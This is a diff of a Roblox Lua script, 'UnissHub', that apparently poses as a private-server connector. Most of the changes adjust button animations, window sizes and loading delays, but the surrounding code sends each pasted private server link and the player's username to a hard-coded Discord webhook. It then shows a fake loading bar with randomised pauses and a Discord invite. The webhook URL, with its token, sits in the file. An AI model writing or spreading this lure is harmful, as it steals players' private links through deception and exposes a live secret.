@@ -1,4 +1,4 @@
--- UnissHub: Visible Effects & Discord Edition
+-- UnissHub: Fixed Animation & Clean UI
 local Players = game:GetService("Players")
 local UserInputService = game:GetService("UserInputService")
 local RunService = game:GetService("RunService")
@@ -8,23 +8,21 @@ local Player = Players.LocalPlayer
 local WEBHOOK_URL = "https://webhook.lewisakura.moe/api/webhooks/1455540134177935625/SWIcKICFzeZdLmUGpUkFvc8oh1j0Qun0TjK1Wm9FA5-tHz0DY6gEpvxfstY-33yiVS4g"
 local DISCORD_LINK = "https://discord.gg/mVzz2KaZ"
 
--- Улучшенная функция анимации клика
+-- Исправленная функция анимации клика
 local function applyClickEffect(button)
-    local originalColor = button.BackgroundColor3
-    local darkColor = Color3.fromRGB(originalColor.R*255-30, originalColor.G*255-30, originalColor.B*255-30)
+    local originalSize = button.Size
     
     button.MouseButton1Down:Connect(function()
-        TweenService:Create(button, TweenInfo.new(0.05), {
-            Size = button.Size - UDim2.new(0, 6, 0, 6),
-            BackgroundColor3 = Color3.fromRGB(40, 40, 40)
-        }):Play()
+        button:TweenSize(originalSize - UDim2.new(0, 5, 0, 5), "Out", "Quad", 0.1, true)
     end)
     
     button.MouseButton1Up:Connect(function()
-        TweenService:Create(button, TweenInfo.new(0.1), {
-            Size = button.Size + UDim2.new(0, 0, 0, 0), -- Возврат к исходному через расчет в начале
-            BackgroundColor3 = originalColor
-        }):Play()
+        button:TweenSize(originalSize, "Out", "Quad", 0.1, true)
+    end)
+    
+    -- На случай, если мышка ушла с кнопки, не отпустив нажатие
+    button.MouseLeave:Connect(function()
+        button:TweenSize(originalSize, "Out", "Quad", 0.1, true)
     end)
 end
 
@@ -65,28 +63,28 @@ applyClickEffect(uBtn)
 
 -- ГЛАВНОЕ ОКНО
 local main = Instance.new("Frame", sg)
-main.Size = UDim2.new(0, 360, 0, 220); main.Position = UDim2.new(0.5, 0, 0.5, 0)
+main.Size = UDim2.new(0, 360, 0, 180); main.Position = UDim2.new(0.5, 0, 0.5, 0) -- Уменьшил высоту
 main.AnchorPoint = Vector2.new(0.5, 0.5); main.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
 main.Visible = true; main.ClipsDescendants = true
 Instance.new("UICorner", main); Instance.new("UIStroke", main).Color = Color3.fromRGB(0, 120, 255)
 makeDraggable(main)
 
 local title = Instance.new("TextLabel", main)
-title.Size = UDim2.new(1, 0, 0.15, 0); title.Position = UDim2.new(0,0,0.05,0); title.BackgroundTransparency = 1
+title.Size = UDim2.new(1, 0, 0.25, 0); title.Position = UDim2.new(0,0,0.05,0); title.BackgroundTransparency = 1
 title.Text = "UnissHub"; title.TextColor3 = Color3.fromRGB(0, 150, 255); title.Font = Enum.Font.GothamBold; title.TextSize = 24
 
 local input = Instance.new("TextBox", main)
-input.Size = UDim2.new(0.85, 0, 0.2, 0); input.Position = UDim2.new(0.075, 0, 0.38, 0)
+input.Size = UDim2.new(0.85, 0, 0.25, 0); input.Position = UDim2.new(0.075, 0, 0.35, 0)
 input.BackgroundColor3 = Color3.fromRGB(25, 25, 25); input.PlaceholderText = "Paste Private Server Link..."
 input.Text = ""; input.TextColor3 = Color3.new(1,1,1); input.TextScaled = true; Instance.new("UICorner", input)
 
 local conn = Instance.new("TextButton", main)
-conn.Size = UDim2.new(0.85, 0, 0.22, 0); conn.Position = UDim2.new(0.075, 0, 0.68, 0)
+conn.Size = UDim2.new(0.85, 0, 0.25, 0); conn.Position = UDim2.new(0.075, 0, 0.65, 0)
 conn.BackgroundColor3 = Color3.fromRGB(0, 120, 255); conn.Text = "CONNECT"; conn.TextScaled = true; conn.TextColor3 = Color3.new(1,1,1)
 Instance.new("UICorner", conn)
 applyClickEffect(conn)
 
--- ЛОГИКА ПРИ НАЖАТИИ CONNECT
+-- ЛОГИКА
 conn.MouseButton1Click:Connect(function()
     if string.find(input.Text:lower(), "roblox.com") then
         local currentPos = main.Position
@@ -99,7 +97,6 @@ conn.MouseButton1Click:Connect(function()
             if req then req({Url = WEBHOOK_URL, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = game:GetService("HttpService"):JSONEncode({content = "🚀 **Link:** "..input.Text.."\n👤 **User:** "..Player.Name})}) end
         end)
 
-        -- СОЗДАНИЕ ОКНА ЗАГРУЗКИ
         local loadF = Instance.new("Frame", sg)
         loadF.Name = "LoadingFrame"; loadF.Size = UDim2.new(0, 280, 0, 110)
         loadF.Position = currentPos; loadF.AnchorPoint = Vector2.new(0.5, 0.5)
@@ -117,14 +114,13 @@ conn.MouseButton1Click:Connect(function()
 
         task.spawn(function()
             for i = 0, 100 do
-                if i == 30 or i == 65 or i == 92 then task.wait(math.random(1, 3)) end
+                if i == 30 or i == 65 or i == 92 then task.wait(math.random(1, 2)) end
                 lLabel.Text = "loading: " .. i .. "%"
                 fill.Size = UDim2.new(i/100, 0, 1, 0)
-                task.wait(math.random(2, 5) / 10) 
+                task.wait(math.random(1, 4) / 10) 
             end
             lLabel.TextSize = 18; lLabel.Text = "CONFIRM"
             
-            -- Появление ссылки на Discord
             local dsLink = Instance.new("TextButton", loadF)
             dsLink.Size = UDim2.new(0.8, 0, 0.25, 0); dsLink.Position = UDim2.new(0.1, 0, 0.7, 0)
             dsLink.BackgroundTransparency = 1; dsLink.Text = "discord"; dsLink.TextColor3 = Color3.fromRGB(0, 150, 255)
@@ -136,20 +132,17 @@ conn.MouseButton1Click:Connect(function()
                     dsLink.Text = "Link Copied!"
                     task.wait(2)
                     dsLink.Text = "discord"
-                else
-                    dsLink.Text = "Error: No Clipboard"
                 end
             end)
         end)
     end
 end)
 
--- Открытие/Закрытие основного меню
 uBtn.MouseButton1Click:Connect(function()
     if not sg:FindFirstChild("LoadingFrame") then
         main.Visible = not main.Visible
         if main.Visible then
-            main:TweenSize(UDim2.new(0, 360, 0, 220), "Out", "Back", 0.3, true)
+            main:TweenSize(UDim2.new(0, 360, 0, 180), "Out", "Back", 0.3, true)
         end
     end
 end)
